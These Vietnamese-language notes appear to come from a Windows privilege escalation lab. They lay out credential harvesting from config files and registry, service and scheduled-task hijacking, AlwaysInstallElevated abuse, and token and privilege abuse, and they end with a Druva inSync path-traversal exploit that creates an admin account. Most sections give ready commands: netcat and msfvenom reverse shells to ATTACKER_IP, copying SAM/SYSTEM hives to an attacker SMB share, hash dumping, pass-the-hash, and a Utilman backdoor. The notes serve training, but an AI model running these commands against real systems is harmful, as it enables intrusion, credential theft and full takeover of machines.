
# Unattended Windows Installations (Cài đặt Windows tự động)

Khi quản trị viên cài đặt Windows hàng loạt, họ thường dùng các file cấu hình tự động (XML, INF). Các file này có thể vô tình chứa tài khoản và mật khẩu Administrator ở dạng văn bản rõ ràng.

**Cách khai thác:** Mở và đọc nội dung các file tại các đường dẫn sau để tìm thẻ `<Credentials>`:

- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

---

# PowerShell History (Lịch sử dòng lệnh PowerShell)

PowerShell tự động lưu lại các lệnh người dùng đã gõ. Nếu quản trị viên vô tình gõ lệnh có chứa mật khẩu, bạn có thể dễ dàng đọc được nó bằng cách xem lại file lịch sử này.

**Câu lệnh (chạy trên `cmd.exe`):**

```dos
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

> **Mẹo:** Nếu bạn đang đứng ở cửa sổ PowerShell, hãy thay `%userprofile%` bằng `$Env:userprofile`

---

# Saved Windows Credentials (Thông tin đăng nhập đã lưu)

Windows cho phép người dùng lưu lại thông tin đăng nhập của tài khoản khác. Bạn có thể kiểm tra danh sách này và lợi dụng cờ `/savecred` để chạy phần mềm dưới quyền tài khoản đó mà không cần biết mật khẩu.

**Câu lệnh liệt kê danh sách tài khoản đã lưu:**

```dos
cmdkey /list
```

**Câu lệnh leo quyền** (ví dụ: mở Command Prompt dưới quyền user khác):

```dos
runas /savecred /user:admin cmd.exe
```

> Thay `admin` bằng tên user mục tiêu mà bạn tìm thấy từ lệnh `cmdkey` ở trên.

---

# IIS Configuration (Cấu hình máy chủ web IIS)

Các website chạy trên máy chủ IIS thường lưu thông tin cấu hình trong file `web.config`. File này rất hay chứa các chuỗi kết nối cơ sở dữ liệu (connection string) bao gồm tên đăng nhập và mật khẩu.

**Câu lệnh tìm nhanh chuỗi kết nối:**

```dos
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

> **Lưu ý:** Bạn cũng có thể áp dụng lệnh này cho đường dẫn `C:\inetpub\wwwroot\web.config`

---

# PuTTY (Phần mềm SSH)

Mặc dù PuTTY không cho phép lưu mật khẩu SSH, nhưng nó lại cho phép lưu thông tin cấu hình Proxy (bao gồm mật khẩu Proxy ở dạng văn bản rõ ràng) bên trong Windows Registry.

**Câu lệnh trích xuất mật khẩu Proxy từ Registry:**

```dos
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

# Scheduled Tasks (Tác vụ theo lịch trình)

Kẻ tấn công tìm kiếm các tác vụ tự động được lên lịch chạy dưới quyền của người dùng khác (hoặc Admin). Sau đó, kiểm tra xem file thực thi (ví dụ: file `.bat` hoặc `.exe`) của tác vụ đó có cho phép người dùng hiện tại sửa đổi/ghi đè hay không. Nếu có, chỉ cần thay thế nội dung file đó bằng mã độc (như Reverse Shell).

**Câu lệnh xem chi tiết một tác vụ:**

> Chú ý phần `Task To Run` để biết đường dẫn file và `Run As User` để biết quyền thực thi.

```dos
schtasks /query /tn vulntask /fo list /v
```

**Câu lệnh kiểm tra quyền trên file thực thi:**

> Tìm ký hiệu `(F)` nghĩa là có toàn quyền sửa đổi.

```dos
icacls c:\tasks\schtask.bat
```

**Câu lệnh ghi đè file thực thi bằng Reverse Shell** (sử dụng netcat):

```dos
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

**Câu lệnh mở cổng lắng nghe trên máy Attacker (Kali Linux):**

```bash
nc -lvp 4444
```

**Câu lệnh ép tác vụ chạy ngay lập tức:**

> Dành cho môi trường CTF để tiết kiệm thời gian chờ.

```dos
schtasks /run /tn vulntask
```

---

# AlwaysInstallElevated (Cài đặt MSI với quyền cao nhất)

Bình thường, file cài đặt Windows (`.msi`) sẽ chạy với quyền của người dùng đang mở nó. Tuy nhiên, nếu tính năng `AlwaysInstallElevated` bị bật sai lầm, hệ thống sẽ cho phép bất kỳ ai chạy file `.msi` cũng sẽ được cấp quyền Administrator (hoặc SYSTEM). Kẻ tấn công có thể lợi dụng điều này bằng cách tự tạo ra một file cài đặt `.msi` chứa mã độc.

**Câu lệnh kiểm tra cấu hình trong Registry:**

> Điều kiện bắt buộc là **cả 2 key** này đều phải tồn tại và được bật.

```dos
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Câu lệnh tạo file `.msi` độc hại trên máy Attacker** (sử dụng msfvenom):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

**Câu lệnh thực thi file cài đặt âm thầm trên máy mục tiêu:**

> Sau khi chạy, máy sẽ trả về shell quyền cao cho Attacker.

```dos
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
# Insecure Permissions on Service Executable (Quyền trên file thực thi lỏng lẻo)

Nếu file thực thi (`.exe`) của một Service cho phép người dùng bình thường ghi đè hoặc sửa đổi, bạn có thể thay thế file gốc bằng một file chứa mã độc (payload). Khi Service khởi động lại, nó sẽ chạy payload của bạn với đặc quyền của tài khoản cấu hình cho Service đó.

**Kiểm tra cấu hình Service:**

> Để xem đường dẫn file và quyền chạy.

```dos
sc qc windowsscheduler
```

**Kiểm tra quyền của file thực thi:**

> Tìm quyền `(M)` - Modify hoặc `(F)` - Full Control cho nhóm `Everyone` hoặc `Users`.

```dos
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

**Tạo payload dưới dạng service (trên máy Kali Linux):**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

**Sao lưu file gốc, đè payload vào thay thế và cấp quyền:**

> Thực hiện sau khi đã tải `rev-svc.exe` lên máy mục tiêu.

```dos
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

**Khởi động lại Service để kích hoạt shell:**

```dos
sc stop windowsscheduler
sc start windowsscheduler
```

---

# Unquoted Service Paths (Đường dẫn không được đặt trong ngoặc kép)

Lỗi này xảy ra khi đường dẫn tới file thực thi của Service chứa dấu cách (spaces) nhưng lại không được bao bọc bởi ngoặc kép `""`. Windows có thể hiểu nhầm dấu cách là khoảng trắng để tách tham số — nó sẽ cắt đường dẫn tại mỗi dấu cách, thêm `.exe` vào cuối và cố gắng chạy các file đó trước. Nếu thư mục cắt ngang cho phép tạo file, bạn có thể thả payload vào đó để "chiếm quyền" (hijack) quá trình khởi chạy.

> **Ví dụ:** Với đường dẫn `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`, Windows sẽ ưu tiên tìm và chạy `C:\MyPrograms\Disk.exe` trước.

**Kiểm tra cấu hình Service:**

> Để tìm đường dẫn không có ngoặc kép ở phần `BINARY_PATH_NAME`.

```dos
sc qc "disk sorter enterprise"
```

**Kiểm tra quyền trên thư mục cắt ngang:**

> Tìm quyền `WD` - Write Data/Add File.

```dos
icacls c:\MyPrograms
```

**Đổi tên payload và đặt vào vị trí cắt ngang để Hijack:**

```dos
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

**Khởi động lại Service để kích hoạt shell:**

```dos
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

---

# Insecure Service Permissions (Quyền cấu hình Service lỏng lẻo)

Ngay cả khi file thực thi được bảo vệ tốt và có ngoặc kép đầy đủ, lỗ hổng vẫn có thể xảy ra nếu bản thân Service (DACL của Service trong SCM) cho phép người dùng bình thường cấu hình lại nó. Bạn có thể trực tiếp đổi thông số `binPath` để trỏ tới payload của mình và ép Service chạy nó dưới quyền cao nhất (`LocalSystem`).

**Kiểm tra DACL của Service:**

> Sử dụng `Accesschk` để xem nhóm `BUILTIN\Users` có quyền `SERVICE_ALL_ACCESS` hay không.

```dos
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```

**Cấp quyền cho file payload sau khi tải lên:**

```dos
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

**Đổi cấu hình Service trỏ tới payload và chạy bằng quyền SYSTEM:**

> Lưu ý: Bắt buộc phải có khoảng trắng sau dấu `=`: `binPath= ` và `obj= `.

```dos
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

**Khởi động lại Service để kích hoạt shell SYSTEM:**

```dos
sc stop THMService
sc start THMService
```
# Abusing Windows Privileges

## Quyền SeBackup / SeRestore

Quyền này cho phép đọc/ghi bất kỳ file nào trên hệ thống, bỏ qua mọi phân quyền (DACL). Kẻ tấn công lợi dụng để sao lưu 2 file cấu hình cốt lõi là SAM và SYSTEM, từ đó trích xuất mã băm (hash) mật khẩu của Administrator và thực hiện tấn công Pass-the-Hash.

**Câu lệnh sao lưu file chứa hash (chạy trên cmd Windows):**

```dos
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

**Câu lệnh mở thư mục chia sẻ (SMB Server) trên máy Kali:**

> Để nhận file từ máy Windows gửi sang.

```bash
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

**Câu lệnh đẩy 2 file vừa sao lưu từ Windows sang máy Kali:**

```dos
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

**Câu lệnh trích xuất mã băm (Hash) từ file vừa nhận (chạy trên Kali):**

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**Câu lệnh Pass-the-Hash để lấy shell SYSTEM (chạy trên Kali):**

> Thay `<hash_của_admin>` và `<IP_Mục_Tiêu>` bằng thông số thực tế.

```bash
python3.9 /opt/impacket/examples/psexec.py -hashes <hash_của_admin> administrator@<IP_Mục_Tiêu>
```

---

## Quyền SeTakeOwnership

Quyền này cho phép người dùng chiếm quyền sở hữu (owner) bất kỳ đối tượng nào. Ta sẽ lạm dụng nó để chiếm file `Utilman.exe` (phần mềm Ease of Access chạy ngầm bằng quyền SYSTEM ở màn hình khóa), tự cấp quyền sửa đổi và tráo đổi nó bằng `cmd.exe`.

**Câu lệnh chiếm quyền sở hữu file Utilman (chạy trên cmd Windows):**

```dos
takeown /f C:\Windows\System32\Utilman.exe
```

**Câu lệnh tự cấp toàn quyền (Full Control) cho user của bạn:**

```dos
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

**Câu lệnh ghi đè (tráo đổi) Utilman bằng Command Prompt:**

> Di chuyển vào thư mục `C:\Windows\System32\` trước khi chạy lệnh này.

```dos
copy cmd.exe utilman.exe
```

**Cách kích hoạt Shell:**

Khóa màn hình máy tính mục tiêu (`Start` > icon User > `Lock`). Tại màn hình khóa, bấm vào biểu tượng **Ease of Access** (góc phải dưới cùng). Command Prompt với quyền SYSTEM sẽ hiện lên.

---

## Quyền SeImpersonate / SeAssignPrimaryToken

Quyền này cho phép một tiến trình mượn "phiên" (token) của người dùng khác. Quyền này hay có sẵn trên các tài khoản dịch vụ web như `iis apppool`. Kẻ tấn công dùng công cụ `RogueWinRM` để lừa service BITS (một dịch vụ chạy bằng SYSTEM) kết nối vào cổng 5985 giả mạo, từ đó cướp token và thực thi lệnh dưới quyền SYSTEM.

**Câu lệnh mở cổng lắng nghe trên máy Kali:**

```bash
nc -lvp 4442
```

**Câu lệnh chạy mã khai thác RogueWinRM (thực thi qua Web Shell trên Windows):**

```dos
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

# Kiểm tra các phần mềm đang cài đặt trên hệ thống

Các phần mềm cài thêm thường bị người dùng/quản trị viên "bỏ quên" không cập nhật thường xuyên như hệ điều hành Windows. Kẻ tấn công sẽ liệt kê danh sách phần mềm này, lấy số phiên bản và lên mạng (Google, Exploit-DB) để tìm mã khai thác có sẵn.

**Câu lệnh liệt kê phần mềm và phiên bản (chạy trên cmd):**

```dos
wmic product get name,version,vendor
```

> **Mẹo:** Lệnh `wmic` có thể không hiển thị đủ 100% phần mềm. Nên kết hợp ngó qua các shortcut trên Desktop hoặc các dịch vụ đang chạy.

---

# Case Study: Phân tích lỗ hổng Druva inSync 6.6.3

**Bản chất lỗi:**

Druva chạy một dịch vụ giao tiếp (RPC) ở cổng mạng nội bộ `6064` với đặc quyền cao nhất là SYSTEM. Nó có một chức năng (thủ tục số 5) cho phép chạy lệnh. Để bảo mật, nhà phát triển yêu cầu mọi lệnh chạy phải bắt đầu bằng đường dẫn thư mục gốc của nó là:

```
C:\ProgramData\Druva\inSync4\
```

**Cách Bypass (Qua mặt) — Path Traversal:**

Hacker sử dụng kỹ thuật Path Traversal (nhảy lùi thư mục bằng chuỗi `..\..\..\`) để lừa hệ thống. Đường dẫn gửi đi bắt đầu đúng theo yêu cầu, nhưng sau đó lập tức lùi ra ngoài để gọi `cmd.exe`:

```
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
```

---

# Kịch bản khai thác & Câu lệnh

Mã khai thác (Exploit) viết bằng PowerShell sẽ kết nối vào cổng `6064` và ép hệ thống chạy lệnh bằng quyền SYSTEM. Thay vì chạy lệnh vô thưởng vô phạt, ta sẽ bắt SYSTEM tạo một tài khoản Admin mới.

**Payload (thay thế vào biến `$cmd` trong đoạn code PowerShell gốc):**

> Lệnh này làm 2 việc: tạo user `pwnd` với mật khẩu `SimplePass123`, sau đó thêm user này vào nhóm Administrators.

```dos
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

**Thực thi mã:**

Mở PowerShell, copy và paste toàn bộ đoạn code exploit (nằm sẵn trong file `C:\tools\Druva_inSync_exploit.txt`) và chạy.

**Câu lệnh kiểm tra thành quả (chạy trên PowerShell hoặc CMD):**

```dos
net user pwnd
```

> Nhìn xuống phần `Local Group Memberships`, nếu thấy `*Administrators` là mã khai thác đã thành công.

**Kết quả**

Chuột phải vào biểu tượng Command Prompt → Chọn **Run as administrator** → Nhập thông tin tài khoản `pwnd` / `SimplePass123`. Bạn đã chính thức chiếm được quyền Admin của máy!


# Automation Tools

<img width="1888" height="1063" alt="image" src="https://github.com/user-attachments/assets/c92650d7-41bb-4015-8b14-1dd45407399a" />

<img width="1886" height="876" alt="image" src="https://github.com/user-attachments/assets/072b8f33-f634-457c-abb0-53311c614992" />


